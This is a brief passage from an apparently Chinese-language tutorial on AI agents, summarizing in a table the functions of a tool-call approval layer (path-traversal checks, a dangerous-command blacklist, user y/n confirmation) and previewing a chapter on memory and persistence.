| `ApprovalManager` | 核心类，根据策略和工具类型决定通过/拒绝/询问 |
| `is_safe_path` | 防止路径穿越攻击，限制写操作在 cwd 内 |
| `is_safe_command` | 黑名单过滤危险 shell 命令 |
| `ask_user_confirmation` | 终端异步交互，等待用户 y/n 确认 |
| `agentic_loop_with_approval` | 集成示例：在 invoke 前插入审批检查 |

下一章将实现 **记忆与持久化**：Agent 在多次对话间保存和检索上下文，解决长任务状态管理问题。